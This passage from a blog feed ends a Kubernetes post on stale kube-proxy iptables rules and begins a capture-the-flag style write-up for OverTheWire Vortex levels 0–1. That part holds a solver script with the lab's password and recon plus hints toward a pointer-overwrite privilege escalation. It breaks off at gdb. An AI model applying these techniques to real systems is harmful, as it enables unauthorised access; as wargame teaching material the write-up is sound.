</span><span class='line'>KUBE-SEP-KNOCRXE7JOQ4FBTI  all  --  anywhere             anywhere             statistic mode random probability 0.03333333321
</span><span class='line'>KUBE-SEP-M5NXUS47V77SM3HZ  all  --  anywhere             anywhere             statistic mode random probability 0.03448275849
</span><span class='line'>KUBE-SEP-VEMFKB2E3QRFFRSG  all  --  anywhere             anywhere             statistic mode random probability 0.03571428591
</span><span class='line'>KUBE-SEP-RRYDQV524YXA4GDR  all  --  anywhere             anywhere             statistic mode random probability 0.03703703685
</span><span class='line'>KUBE-SEP-G65AAYF5LWFW4YBM  all  --  anywhere             anywhere             statistic mode random probability 0.03846153850
</span><span class='line'>KUBE-SEP-K4HN6ANXSPKA7JGZ  all  --  anywhere             anywhere             statistic mode random probability 0.04000000004
</span><span class='line'>KUBE-SEP-72YXYSKWHCML6KJJ  all  --  anywhere             anywhere             statistic mode random probability 0.04166666651
</span><span class='line'>KUBE-SEP-YCD5TFDQM4ELQ5WX  all  --  anywhere             anywhere             statistic mode random probability 0.04347826075
</span><span class='line'>KUBE-SEP-U7N4W7N5OKDP5PNC  all  --  anywhere             anywhere             statistic mode random probability 0.04545454541
</span><span class='line'>KUBE-SEP-ACPRKJJSJ73NAQNV  all  --  anywhere             anywhere             statistic mode random probability 0.04761904757
</span><span class='line'>KUBE-SEP-HPAV4MFMKCM43BC2  all  --  anywhere             anywhere             statistic mode random probability 0.04999999981
</span><span class='line'>KUBE-SEP-VXO5CPBPAES2GS3A  all  --  anywhere             anywhere             statistic mode random probability 0.05263157887
</span><span class='line'>KUBE-SEP-LJ3HM5QDYEB4ICUB  all  --  anywhere             anywhere             statistic mode random probability 0.05555555550
</span><span class='line'>KUBE-SEP-W6VORIPTN7FDPIMU  all  --  anywhere             anywhere             statistic mode random probability 0.05882352963
</span><span class='line'>KUBE-SEP-A5SGQE4VKXUT2NEC  all  --  anywhere             anywhere             statistic mode random probability 0.06250000000
</span><span class='line'>KUBE-SEP-4LCLRUWZUF2DDGKK  all  --  anywhere             anywhere             statistic mode random probability 0.06666666688
</span><span class='line'>KUBE-SEP-K7NZ33CKVQDPMIET  all  --  anywhere             anywhere             statistic mode random probability 0.07142857136
</span><span class='line'>KUBE-SEP-76ISGBIKEK2QPYDL  all  --  anywhere             anywhere             statistic mode random probability 0.07692307699
</span><span class='line'>KUBE-SEP-3S5ELV7JJCII2KNO  all  --  anywhere             anywhere             statistic mode random probability 0.08333333349
</span><span class='line'>KUBE-SEP-THLYLIADKU5Z5I32  all  --  anywhere             anywhere             statistic mode random probability 0.09090909082
</span><span class='line'>KUBE-SEP-T7P5MBD5MAWH2XB5  all  --  anywhere             anywhere             statistic mode random probability 0.10000000009
</span><span class='line'>KUBE-SEP-WQ6DVZHCVUTU5QJS  all  --  anywhere             anywhere             statistic mode random probability 0.11111111101
</span><span class='line'>KUBE-SEP-5RVGOA4UDKOKKI7O  all  --  anywhere             anywhere             statistic mode random probability 0.12500000000
</span><span class='line'>KUBE-SEP-VSXQV2AZ43RZQSL7  all  --  anywhere             anywhere             statistic mode random probability 0.14285714272
</span><span class='line'>KUBE-SEP-RVDWX7YLRKCSUDII  all  --  anywhere             anywhere             statistic mode random probability 0.16666666651
</span><span class='line'>KUBE-SEP-OECSAM56W6JQA562  all  --  anywhere             anywhere             statistic mode random probability 0.20000000019
</span><span class='line'>KUBE-SEP-HY76TWODHVCVLG5Y  all  --  anywhere             anywhere             statistic mode random probability 0.25000000000
</span><span class='line'>KUBE-SEP-3UNVKH34LEKZ2P5K  all  --  anywhere             anywhere             statistic mode random probability 0.33333333349
</span><span class='line'>KUBE-SEP-TDCXKWGVKJJ22VHB  all  --  anywhere             anywhere             statistic mode random probability 0.50000000000
</span><span class='line'>KUBE-SEP-Z7ZOTGJIY44EKMWW  all  --  anywhere             anywhere
</span><span class='line'>
</span><span class='line'># List the rules of two random chains above to see the DNAT'ed Pod IP
</span><span class='line'>root@toolbox:~# iptables -L KUBE-SEP-RVDWX7YLRKCSUDII -t nat
</span><span class='line'>Chain KUBE-SEP-RVDWX7YLRKCSUDII (1 references)
</span><span class='line'>target     prot opt source               destination
</span><span class='line'>KUBE-MARK-MASQ  all  --  10.179.94.16         anywhere
</span><span class='line'>DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent
</span><span class='line'>
</span><span class='line'>root@toolbox:~# iptables -L KUBE-SEP-6PL2LOTBN64MN2IF -t nat
</span><span class='line'>Chain KUBE-SEP-6PL2LOTBN64MN2IF (1 references)
</span><span class='line'>target     prot opt source               destination
</span><span class='line'>KUBE-MARK-MASQ  all  --  10.179.45.66         anywhere
</span><span class='line'>DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent</span></code></pre></td></tr></table></div></figure>


<p>These final rules are the ones that actually replace the destination Cluster IP of 10.178.64.10 with
a randomly chosen <code>kube-dns</code> Pod IP. The random selection is implemented by the rules in the
<code>KUBE-SVC-ERIFXISQEP7F7OF4</code> chain which have <code>statistic mode random probability p</code>. Rules are
matched top down. So the first rule with target <code>KUBE-SEP-BMNCBK7ROA3MA6UU</code> has a probability of
0.01538461540 of being picked. The second rule with target <code>KUBE-SEP-GYUBQUCI6VR6AER2</code> has a
probability of 0.01562500000 of being picked. But this 0.01562500000 is applied to the probability
that the first rule didn&rsquo;t match. So its overall probability is (1 - 0.01538461540) * 0.01562500000
~= 0.01538461540. Applying this calculation to the other rules, you can see each rule has a
probability of 0.01538461540 or <code>1/n</code> in being selected where <code>n</code> = 65 is the total number of kube-dns
Pods in this case. This algorithm is actually a variation of <a href="https://en.wikipedia.org/wiki/Reservoir_sampling">reservoir sampling</a>.</p>

<h3>Confirming the Root Cause</h3>

<p>At this point I strongly suspected the iptables rules were stale and routing packets to kube-dns
Pod IPs that no longer exist. In order to confirm this I wanted to find an actual DNAT&#8217;ed IP that
didn&rsquo;t correspond to any actual kube-dns Pod. There were 65 rules in the <code>KUBE-SVC-ERIFXISQEP7F7OF4</code>
chain, but I expected 77 because that was the number of <code>kube-dns</code> Pods.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kubectl --context my-gke-cluster -n kube-system get endpoints kube-dns -o json | jq -r .subsets[0].addresses | jq length
</span><span class='line'>77</span></code></pre></td></tr></table></div></figure>


<p>On nodes without DNS issues, I saw the correct number of rules.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@healthy-gke-node:~# iptables -L KUBE-SVC-ERIFXISQEP7F7OF4 -t nat | wc -l
</span><span class='line'>79 [two extra lines of headers]</span></code></pre></td></tr></table></div></figure>


<p>I saw this Pod IP when inspecting a randomly chosen rule on <code>my-gke-node</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@toolbox:~# iptables -L KUBE-SEP-RVDWX7YLRKCSUDII -t nat
</span><span class='line'>Chain KUBE-SEP-RVDWX7YLRKCSUDII (1 references)
</span><span class='line'>target     prot opt source               destination
</span><span class='line'>KUBE-MARK-MASQ  all  --  10.179.94.16         anywhere
</span><span class='line'>DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent</span></code></pre></td></tr></table></div></figure>


<p>No <code>kube-dns</code> Pod existed with this IP.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kubectl --context my-gke-cluster -n kube-system get pods --selector k8s-app=kube-dns -o wide | grep 10.179.94.16
</span><span class='line'>[no output]</span></code></pre></td></tr></table></div></figure>


<p>This confirmed <code>kube-proxy</code> wasn&rsquo;t updating the iptables rules for <code>kube-dns</code>. Why? The <code>kube-proxy</code>
logs on the node showed these ongoing occurring errors.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-gke-node ~ $ tail -f /var/log/kube-proxy.log
</span><span class='line'>E0126 20:40:24.739255       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Service: an error on the server ("") has prevented the request from succeeding (get services)
</span><span class='line'>E0126 20:40:24.739611       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Endpoints: an error on the server ("") has prevented the request from succeeding (get endpoints)
</span><span class='line'>E0126 20:40:34.742869       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Service: an error on the server ("") has prevented the request from succeeding (get services)</span></code></pre></td></tr></table></div></figure>


<h2>The Speculative Fix</h2>

<p>I think these <code>kube-proxy</code> errors are caused by this underlying K8s bug, but I&rsquo;m not sure.</p>

<blockquote><p>we found that after the problem occurred all subsequent requests were still send on the same
connection. It seems that although the client will resend the request to apiserver, but the
underlay http2 library still maintains the old connection so all subsequent requests are still
send on this connection and received the same error use of closed connection.</p>

<p>So the question is why http2 still maintains an already closed connection? Maybe the connection it
maintained is indeed alive but some intermediate connections are closed unexpectedly?</p></blockquote>

<p>&mdash; <a href="https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-596312532">https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-596312532</a></p>

<p>The bug in that issue is <a href="https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-743342319">fixed in K8s 1.19 and 1.20</a>.</p>

<p>If you&rsquo;re using GKE and Google Cloud Monitoring, this log query will show which nodes&#8217; kube-proxy
Pods can&rsquo;t get updated Service and Endpoint data from the K8s API.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>resource.type="k8s_node"
</span><span class='line'>resource.labels.project_id="[YOUR-PROJECT]"
</span><span class='line'>logName="projects/[YOUR-PROJECT]/logs/kube-proxy"
</span><span class='line'>jsonPayload.message:"Failed to list "
</span><span class='line'>severity=ERROR</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Hints and Solutions to the First Three Levels of Over the Wire Vortex]]></title>
    <link href="https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex/"/>
    <updated>2020-12-25T20:21:28-05:00</updated>
    <id>https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex</id>
    <content type="html"><![CDATA[<p>I recently found more wargames at <a href="https://overthewire.org/">overthewire.org</a>. Here are my hints and
solutions for the first three levels of Vortex. The levels are cumulative. We
have to beat the previous level in order to access the next.</p>

<h1><a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a></h1>

<p><details>
  <summary>Hint 1: how much data</summary>
  Connect to the host and port and read all the bytes you can. How many bytes do you get?
</details></p>

<p><details>
  <summary>Hint 2: endianess</summary>
  &ldquo;&hellip;read in 4 unsigned integers in host byte order&rdquo; means the bytes are
  already in host byte order or little-endian. If your system is also
  little-endian, you don&rsquo;t need to do anything special when interpreting the
  bytes.
</details></p>

<p><details>
  <summary>Hint 3: expected reply</summary>
  How many bytes is each integer? What is the sum of all four?
</details></p>

<!-- more -->


<h2>My solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python3</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Example output</span>
</span><span class='line'><span class="c"># got bytes 53 ac 40 65 d4 36 07 63 5b 74 dd 4b 0f b6 cc 4d</span>
</span><span class='line'><span class="c"># sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is 5938220433</span>
</span><span class='line'><span class="c"># replying with bytes 91 0d f2 61 01 00 00 00</span>
</span><span class='line'><span class="c"># Username: vortex1 Password: Gq#qu3bF3</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">binascii</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;vortex.labs.overthewire.org&#39;</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">5842</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&#39;got bytes {r.hex(&quot; &quot;)}&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span><span class='line'><span class="c"># Since the machine is a 32-bit system, each integer will be four bytes.</span>
</span><span class='line'><span class="c"># So we interpret each integer four bytes at a time.</span>
</span><span class='line'><span class="n">int_a</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">ba</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="n">int_b</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">ba</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="n">int_c</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">ba</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">12</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="n">int_d</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">ba</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">16</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Sum all the integers.</span>
</span><span class='line'><span class="n">_sum</span> <span class="o">=</span> <span class="n">int_a</span> <span class="o">+</span> <span class="n">int_b</span> <span class="o">+</span> <span class="n">int_c</span> <span class="o">+</span> <span class="n">int_d</span>
</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&#39;sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is {_sum}&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Packing like this seems to take care of endianess by default</span>
</span><span class='line'><span class="n">reply_bytes</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;Q&#39;</span><span class="p">,</span> <span class="n">_sum</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&#39;replying with bytes {reply_bytes.hex(&quot; &quot;)}&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">reply_bytes</span><span class="p">)</span>
</span><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<h1><a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a></h1>

<p>This solution assumes we have solved the previous level and can SSH into the
machine as user vortex1. Caveat: the machine is extremely slow.</p>

<p>First let&rsquo;s find out some information about the machine.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="n">vortex1</span><span class="nd">@vortex.labs.overthewire.org</span> <span class="o">-</span><span class="n">p</span> <span class="mi">2228</span>
</span><span class='line'>                 <span class="n">_</span>
</span><span class='line'><span class="n">__</span>   <span class="n">_____</span>  <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_____</span>  <span class="n">__</span>
</span><span class='line'>\ \ <span class="o">/</span> <span class="o">/</span> <span class="n">_</span> \<span class="o">|</span> <span class="s">&#39;__| __/ _ \ \/ /</span>
</span><span class='line'> \ <span class="n">V</span> <span class="o">/</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">||</span>  <span class="n">__</span><span class="o">/&gt;</span>  <span class="o">&lt;</span>
</span><span class='line'>  \<span class="n">_</span><span class="o">/</span> \<span class="n">___</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span>\<span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>\<span class="n">_</span>\
</span><span class='line'>
</span><span class='line'><span class="n">a</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">overthewire</span><span class="o">.</span><span class="n">org</span> <span class="n">wargame</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">vortex1</span><span class="nd">@vortex.labs.overthewire.org</span><span class="s">&#39;s password:</span>
</span><span class='line'><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">14.04</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">4.4</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">92</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'> <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
</span><span class='line'>
</span><span class='line'><span class="n">The</span> <span class="n">programs</span> <span class="n">included</span> <span class="k">with</span> <span class="n">the</span> <span class="n">Ubuntu</span> <span class="n">system</span> <span class="n">are</span> <span class="n">free</span> <span class="n">software</span><span class="p">;</span>
</span><span class='line'><span class="n">the</span> <span class="n">exact</span> <span class="n">distribution</span> <span class="n">terms</span> <span class="k">for</span> <span class="n">each</span> <span class="n">program</span> <span class="n">are</span> <span class="n">described</span> <span class="ow">in</span> <span class="n">the</span>
</span><span class='line'><span class="n">individual</span> <span class="n">files</span> <span class="ow">in</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/*/</span><span class="n">copyright</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">Ubuntu</span> <span class="n">comes</span> <span class="k">with</span> <span class="n">ABSOLUTELY</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span>
</span><span class='line'><span class="n">applicable</span> <span class="n">law</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s a machine running Ubuntu 14.04.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">vortex1</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">i</span>
</span><span class='line'><span class="n">x86_64</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s a 64-bit system.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">vortex1</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span>
</span><span class='line'><span class="mi">0</span>
</span></code></pre></td></tr></table></div></figure>


<p>ASLR is disabled.</p>

<p><details>
  <summary>Hint 1: password location for next level</summary>
  The instructions don&rsquo;t tell you this, but the password for the next level is
  located in the directory <code>/etc/vortex_pass</code>.
</details></p>

<p><details>
  <summary>Hint 2: required permissions</summary>
  What are the permissions of the password file for the next level? How can you
  read this file?
</details></p>

<p><details>
  <summary>Hint 3: program source code</summary>
  What does the program do? Can you see the code path you need to execute to
  elevate your privileges?
</details></p>

<p><details>
  <summary>Hint 4: how to change <code>ptr</code></summary>
  How can you change the value of <code>ptr</code> to the right value? You shouldn&rsquo;t need
  to send more than ~300 bytes to the program to do so.
</details></p>

<h2>My solution</h2>

<p>Let&rsquo;s disassemble the executable to gain some insight into the stack layout.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">vortex1</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span>
</span><span class='line'><span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="mf">7.7</span><span class="o">.</span><span class="mi">1</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu5</span><span class="o">~</span><span class="mf">14.04</span><span class="o">.</span><span class="mi">3</span><span class="p">)</span> <span class="mf">7.7</span><span class="o">.</span><span class="mi">1</span>
</span><span class='line'><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2014</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="o">.</span>
</span><span class='line'><span class="n">License</span> <span class="n">GPLv3</span><span class="o">+</span><span class="p">:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="ow">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">licenses</span><span class="o">/</span><span class="n">gpl</span><span class="o">.</span><span class="n">html</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
</span><span class='line'><span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>  <span class="n">Type</span> <span class="s">&quot;show copying&quot;</span>
</span><span class='line'><span class="ow">and</span> <span class="s">&quot;show warranty&quot;</span> <span class="k">for</span> <span class="n">details</span><span class="o">.</span>
</span><span class='line'><span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="k">as</span> <span class="s">&quot;x86_64-linux-gnu&quot;</span><span class="o">.</span>
</span><span class='line'><span class="n">Type</span> <span class="s">&quot;show configuration&quot;</span> <span class="k">for</span> <span class="n">configuration</span> <span class="n">details</span><span class="o">.</span>
</span><span class='line'><span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="n">see</span><span class="p">:</span>
